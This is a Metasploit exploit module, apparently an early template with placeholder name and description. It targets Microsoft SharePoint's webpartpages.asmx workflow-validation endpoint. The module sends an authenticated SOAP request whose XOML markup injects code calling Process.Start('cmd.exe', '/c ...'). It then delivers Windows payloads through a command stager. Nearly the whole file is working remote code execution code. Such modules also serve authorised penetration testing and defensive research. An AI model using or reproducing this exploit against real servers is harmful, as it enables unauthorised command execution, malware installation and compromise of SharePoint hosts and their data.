# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Exploit Module Template',
      'Description' => %q{
        Template description.
      },
      'Author' => 'Spencer McIntyre',
      'License' => MSF_LICENSE,
      'References' => [
        # ['CVE', ''],
        # ['EDB', ''],
        # ['URL', ''],
      ],
      'Platform' => 'win',
      'Targets' => [
        [ 'Windows (x86)', { 'Arch' => ARCH_X86, 'Type' => :windows_dropper } ],
        [ 'Windows (x64)', { 'Arch' => ARCH_X64, 'Type' => :windows_dropper } ],
        [ 'Windows (cmd)', { 'Arch' => ARCH_CMD, 'Type' => :windows_command, 'Space' => 3000 } ]
      ],
      'DefaultOptions' => {
        'SSL' => true
      },
      'DefaultTarget' => 0,
      'DisclosureDate' => '2020-03-02',
      'Notes' =>
      # see: https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/constants.rb
      {
        'Stability' => [CRASH_SAFE,],
        'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
        'Reliability' => [REPEATABLE_SESSION],
      },
      'Privileged' => true
    ))

    register_options([
      OptString.new('TARGETURI', [ true, 'The base path to the SharePoint application', '/' ]),
      OptString.new('DOMAIN',    [ true, 'The domain to use for Windows authentication', 'WORKSTATION' ]),
      OptString.new('USERNAME',  [ true, 'Username to authenticate as', '' ]),
      OptString.new('PASSWORD',  [ true, 'The password to authenticate with' ])
    ])
    register_advanced_options([
      OptFloat.new('CMDSTAGER::DELAY', [ true, 'Delay between command executions', 0.5 ]),
    ])
  end

  def check
    # CheckCode::Unknown
    # CheckCode::Safe
    # CheckCode::Detected
    # CheckCode::Appears
    # CheckCode::Vulnerable
    # CheckCode::Unsupported
  end

  def exploit
    if target['Type'] == :windows_command
      execute_command(payload.encoded)
    else
      cmd_target = targets.select {|target| target['Type'] == :windows_command}.first
      execute_cmdstager({linemax: cmd_target.opts['Space'], delay: datastore['CMDSTAGER::DELAY'], nodelete: true})
    end
  end

  def escape_command(cmd)
    cmd.gsub('\\', '\\\\\\\\').gsub('"', '\\\\"').gsub('\'', '\\\\\'').gsub('&', '&amp;')
  end

  def execute_command(cmd, opts = {})
    xoml_data = <<-EOS
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <ValidateWorkflowMarkupAndCreateSupportObjects xmlns="http://microsoft.com/sharepoint/webpartpages">
      <workflowMarkupText>
        <![CDATA[
          <SequentialWorkflowActivity x:Class="MyWorkflow" x:Name="foobar" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/workflow">
            <CallExternalMethodActivity x:Name="foo" MethodName='test1' InterfaceType='System.String);}Object/**/test2=System.Diagnostics.Process.Start("cmd.exe", "/c #{escape_command(cmd)}");private/**/void/**/foobar(){//' />
          </SequentialWorkflowActivity>
        ]]>
      </workflowMarkupText>
      <rulesText></rulesText>
      <configBlob></configBlob>
      <flag>2</flag>
    </ValidateWorkflowMarkupAndCreateSupportObjects>
  </soap:Body>
</soap:Envelope>
    EOS

    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path, '_vti_bin', 'webpartpages.asmx'),
      'ctype' => 'text/xml; charset=utf-8',
      'data'      => xoml_data,
      'username'  => datastore['USERNAME'],
      'password'  => datastore['PASSWORD']
    })

    unless res&.code == 200
      print_error('Non-200 HTTP response received while trying to execute the command')
    end
  end
end
